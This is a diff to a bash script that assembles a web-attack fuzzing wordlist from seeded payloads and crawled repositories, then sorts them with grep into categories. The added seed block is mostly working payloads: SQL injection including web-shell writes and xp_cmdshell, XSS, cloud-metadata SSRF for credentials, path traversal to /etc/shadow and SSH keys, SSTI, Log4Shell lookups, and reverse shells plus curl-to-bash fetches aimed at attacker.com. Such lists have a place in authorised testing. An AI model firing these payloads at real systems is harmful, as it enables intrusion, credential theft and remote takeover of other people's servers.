@@ -102,56 +102,232 @@ REPOS=(
 seed_data() {
     echo "[*] Injecting professional baseline seeds..."
     cat <<'EOF' >> "${TEMP_DIR}/new_master.txt"
+# --- SQL INJECTION ---
 ' OR 1=1--
-admin' --
+' OR '1'='1
+" OR "1"="1
+' OR 1=1#
+" OR 1=1#
+' OR 1=1/*
+admin'--
+admin' #
+admin'/*
+' UNION SELECT NULL--
+' UNION SELECT NULL,NULL--
 ' UNION SELECT NULL,NULL,NULL--
+' UNION SELECT 1,2,3--
 ' OR SLEEP(5)--
+' OR SLEEP(10)--
+' AND (SELECT 1 FROM (SELECT(SLEEP(5)))a)--
+' AND (SELECT 1 FROM (SELECT(SLEEP(10)))a)--
+" OR SLEEP(5)--
+WAITFOR DELAY '0:0:5'--
+WAITFOR DELAY '0:0:10'--
+(SELECT (CASE WHEN (1=1) THEN SLEEP(5) ELSE 1 END))
+' OR 2+2=4--
+' OR 3*3=9--
+' AND 1=2 UNION SELECT 1,2,3,4,5--
+' OR 'a'='a'--
+' OR 1=1 LIMIT 1--
+' OR 1=1 LIMIT 1 OFFSET 1--
+' OR 1=1 GROUP BY 1--
+' OR 1=1 ORDER BY 1--
+' OR 1=1 HAVING 1=1--
+' UNION SELECT @@version,NULL--
+' UNION SELECT user(),NULL--
+' UNION SELECT database(),NULL--
+' UNION SELECT schema(),NULL--
+' UNION SELECT load_file('/etc/passwd'),NULL--
+' UNION SELECT table_name,NULL FROM information_schema.tables--
+' UNION SELECT column_name,NULL FROM information_schema.columns--
+' OR 1=1 INTO OUTFILE '/var/www/html/shell.php'--
+' OR 1=1 INTO DUMPFILE '/tmp/exploit'--
+'); DROP TABLE users;--
+'; EXEC xp_cmdshell('whoami');--
+' OR 1=1--+-
+' OR 1=1#
+' OR 1=1-- 
+' OR '1'='1'--
+' OR '1'='1' /*
+' OR 1=1 %00
+' OR 1=1 %23
+' OR 1=1 %2D%2D
+
+# --- XSS PAYLOADS ---
 <script>alert(1)</script>
+<script>alert('XSS')</script>
+<script>confirm(1)</script>
+<script>prompt(1)</script>
 <img src=x onerror=alert(1)>
+<img src=x onerror=confirm(1)>
+<img src="javascript:alert(1)">
 <svg/onload=alert(1)>
+<svg/onload=confirm(1)>
+<svg><script>alert(1)</script></svg>
+<iframe src="javascript:alert(1)"></iframe>
+<body onload=alert(1)>
+<details open ontoggle=alert(1)>
+<input onfocus=alert(1) autofocus>
+<video><source onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+<marquee onstart=alert(1)>
+<math><mtext><option><annotation><legend><path><svg><rect><foreignObject><p><table><script>alert(1)</script>
+<a href="javascript:alert(1)">Click Me</a>
+<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">Click Me</a>
+<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.4.6/angular.js"></script><div ng-app>{{'a'.constructor.prototype.charAt=[].join;$eval('x=1} Garrett(1);//');}}</div>
+<object data="javascript:alert(1)">
+<embed src="javascript:alert(1)">
+<isindex type=image src=1 onerror=alert(1)>
+<form><button formaction="javascript:alert(1)">Click Me</button></form>
+<xmp><p title="</xmp><svg/onload=alert(1)>">
+"><script>alert(1)</script>
+'><script>alert(1)</script>
 javascript:alert(1)
+javascript:confirm(1)
+javascript:prompt(1)
+%3Cscript%3Ealert(1)%3C/script%3E
+%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E
+
+# --- SSRF & CLOUD ---
 http://169.254.169.254/latest/meta-data/
+http://169.254.169.254/latest/user-data/
+http://169.254.169.254/latest/meta-data/iam/security-credentials/
 http://metadata.google.internal/computeMetadata/v1/
+http://metadata.google.internal/computeMetadata/v1/instance/attributes/
+http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token
+http://10.0.0.1
 http://127.0.0.1:80
+http://127.0.0.1:443
+http://127.0.0.1:22
+http://127.0.0.1:3306
+http://127.0.0.1:6379
+http://localhost:80
+http://localhost:443
+http://[::]:80
+http://0.0.0.0:80
+http://0:80
+http://127.1:80
+http://127.666.1:80
+http://0177.0.0.1:80
+dict://127.0.0.1:6379/
+gopher://127.0.0.1:6379/_SET%20test%201
+file:///etc/passwd
+file:///etc/hosts
+file:///proc/self/environ
+file:///c:/windows/win.ini
+http://instance-data/latest/meta-data/
+http://169.254.169.254.nicelocal.com/
+http://spoofed.169.254.169.254.xip.io/
+
+# --- LFI & PATH TRAVERSAL ---
 /etc/passwd
+/etc/shadow
+/etc/group
+/etc/hosts
+/etc/crontab
+/etc/issue
+/proc/self/environ
+/proc/self/cmdline
+/proc/version
+/var/log/apache2/access.log
+/var/log/nginx/access.log
+/var/log/httpd/access.log
+/var/log/auth.log
+/var/log/syslog
+../../../../etc/passwd
 ../../../../../../etc/passwd
+../../../../../../../../etc/passwd
+..\..\..\..\..\..\windows\win.ini
 C:\windows\win.ini
+C:\windows\system32\drivers\etc\hosts
 php://filter/convert.base64-encode/resource=index.php
+php://filter/read=string.rot13/resource=index.php
+expect://id
+data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjbWQnXSk7ID8+
+/wp-config.php
+/config.php
+/web.config
+/.env
+/.git/config
+/.bash_history
+/.ssh/id_rsa
+
+# --- SSTI ---
 {{7*7}}
 ${7*7}
 <%= 7*7 %>
-; id;
-\$(whoami)
-| ping -c 3 attacker.com
-<!DOCTYPE r [<!ENTITY xxe SYSTEM "file:///etc/passwd">]> <r>&xxe;</r>
-<!ENTITY % remote SYSTEM "http://attacker.com/evil.dtd">%remote;
-//google.com
-https://google.com
-/\google.com
-{"\$gt": ""}
-{"\$ne": null}
-admin' || '1'=='1
-*)(cn=*)
-*)(&(uid=admin))
-X-Forwarded-For: 127.0.0.1
-User-Agent: () { :; }; echo; /bin/id
-eyJhbGciOiJub25lIn0.eyJzdWIiOiJhZG1pbiJ9.
-eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJhZG1pbiJ9.
-%0d%0aSet-Cookie:session=hacked
-{__schema{types{name}}}
-query { user { password } }
-Origin: https://attacker.com
-Access-Control-Allow-Origin: *
-O:8:"Exploit":1:{s:4:"data";s:4:"test";}
-rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcG
-__proto__[test]=test
-constructor.prototype.test=test
-169.254.169.254
-aws_access_key_id
-/wp-config.php
-/wp-login.php
-%2e%2e%2f
-%252e%252e%252f
+#{7*7}
+*{7*7}
+{{config}}
+{{settings}}
+{{self.__dict__}}
+{{request.application.__self__._mw_app.settings}}
+{{ ''.__class__.__mro__[2].__subclasses__() }}
+{% import "os" %}{{ os.popen("whoami").read() }}
+{{ self.template.module.os.popen('whoami').read() }}
+${{7*7}}
+[[7*7]]
+<%- 7*7 %>
+@{{7*7}}
+
+# --- RCE & CMD INJECTION ---
+; id
+; whoami
+; ls -la
+; cat /etc/passwd
+; uname -a
+| id
+| whoami
+| uname -a
+& id
+& whoami
+`id`
+`whoami`
+$(id)
+$(whoami)
+; sleep 5
+| sleep 5
+& sleep 5
+; wget http://attacker.com/shell.sh
+; curl http://attacker.com/shell.sh | bash
+; nc -e /bin/sh attacker.com 4444
+; bash -i >& /dev/tcp/attacker.com/4444 0>&1
+; python -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("attacker.com",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+
+# --- INJECTION VARIANTS (CSV, XPath, SSI, Code, Log) ---
+=SUM(1+1)*cmd|' /C calc'!A0
+@SUM(1+2)
+-5+2+cmd|' /C calc'!A0
++DDE("cmd";"/C calc";"__DDE__")
+' or 1=1 or ''='
+' or '1'='1' or ''='
+//*
+count(/child::node())
+count(//*[position()=1])
+<!--#exec cmd="ls" -->
+<!--#exec cmd="whoami" -->
+<!--#echo var="DATE_LOCAL" -->
+<!--#include virtual="/etc/passwd" -->
+phpinfo();
+__import__('os').system('ls')
+#{root}
+eval("echo 123");
+${jndi:ldap://attacker.com/a}
+${jndi:dns://attacker.com/a}
+${jndi:rmi://attacker.com/a}
+${${env:ENV_NAME}}
+${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attacker.com/a}
+\r\nBcc: victim@domain.com
+\r\nSubject: Spoofed
+\r\nContent-Type: text/html\r\n\r\n<h1>Hacked</h1>
+input[value^="a"] { background-image: url('https://attacker.com/exfil?char=a'); }
+body { background: url("javascript:alert(1)"); }
+?id[]=1
+where: "id = 1 OR 1=1"
+' OR Name LIKE '%'
+FIND {admin*}
+{__name__=~".+"}
+up{job=".*"}
 EOF
 }
 
@@ -281,6 +457,36 @@ grep -iP "wp-config|wp-admin|wp-login|wp-content|wp-includes|xmlrpc\.php|/wp-jso
 # 20. Encoding / Bypass
 grep -iP "^(%[0-9a-f]{2}){2,}|^0x[0-9a-f]+|&#x[0-9a-f]+;|\\\\u[0-9a-f]{4}|\\\\x[0-9a-f]{2}|base64|%00|null\s*byte" "$SRC" | sort -u > "${DATA_DIR}/encoding.txt"
 
+# 21. CSV Injection
+grep -iP "^[=\+\-\@].*\(.*\)" "$SRC" | sort -u > "${DATA_DIR}/csv.txt"
+
+# 22. XPath Injection
+grep -iP "'\s*or\s*1=1|\/\/\*|count\(|child::|parent::|descendant::" "$SRC" | sort -u > "${DATA_DIR}/xpath.txt"
+
+# 23. SSI Injection
+grep -iP "<!--#|#exec|#include|#echo|#config" "$SRC" | sort -u > "${DATA_DIR}/ssi.txt"
+
+# 24. Code Injection
+grep -iP "(eval|exec|system|passthru|popen|shell_exec|base64_decode|__import__|require|include)\s*\(" "$SRC" | sort -u > "${DATA_DIR}/code.txt"
+
+# 25. Log Injection
+grep -iP "\$\{jndi:|\$\{env:|\$\{\w+:|%d\{|%m\{|%n" "$SRC" | sort -u > "${DATA_DIR}/log.txt"
+
+# 26. SMTP / Email Injection
+grep -iP "(\\\\r\\\\n|%0d%0a)(bcc|cc|to|subject|from):" "$SRC" | sort -u > "${DATA_DIR}/smtp.txt"
+
+# 27. CSS Injection
+grep -iP "expression\(|background-image:\s*url|behavior:|@-moz-document|@import\s+url" "$SRC" | sort -u > "${DATA_DIR}/css.txt"
+
+# 28. ORM Injection
+grep -iP "\?id\[\]=|where:\s*\"|find_by|ActiveRecord|Hibernate" "$SRC" | sort -u > "${DATA_DIR}/orm.txt"
+
+# 29. SOQL / SOSL Injection
+grep -iP "SELECT\s+.*\s+FROM\s+.*\s+WHERE|FIND\s+\{.*\}|Name\s+LIKE" "$SRC" | sort -u > "${DATA_DIR}/soql.txt"
+
+# 30. PromQL Injection
+grep -iP "\{__name__=~|\{.*=\".*\"\}|histogram_quantile|rate\(" "$SRC" | sort -u > "${DATA_DIR}/promql.txt"
+
 # ── FINALIZE ────────────────────────────────────────────────
 mv "${TEMP_DIR}/new_master.txt" "$MASTER_LIST"
 rm -rf "$TEMP_DIR"
@@ -310,5 +516,12 @@ echo " RCE            : $(wc -l < ${DATA_DIR}/rce.txt)"
 echo " XXE            : $(wc -l < ${DATA_DIR}/xxe.txt)"
 echo " NoSQL          : $(wc -l < ${DATA_DIR}/nosql.txt)"
 echo " JWT            : $(wc -l < ${DATA_DIR}/jwt.txt)"
+echo " CSV            : $(wc -l < ${DATA_DIR}/csv.txt)"
+echo " XPath          : $(wc -l < ${DATA_DIR}/xpath.txt)"
+echo " SSI            : $(wc -l < ${DATA_DIR}/ssi.txt)"
+echo " Code           : $(wc -l < ${DATA_DIR}/code.txt)"
+echo " Log            : $(wc -l < ${DATA_DIR}/log.txt)"
+echo " SMTP           : $(wc -l < ${DATA_DIR}/smtp.txt)"
+echo " CSS            : $(wc -l < ${DATA_DIR}/css.txt)"
 echo " Repos Crawled  : ${#REPOS[@]}"
 echo "═══════════════════════════════════════"
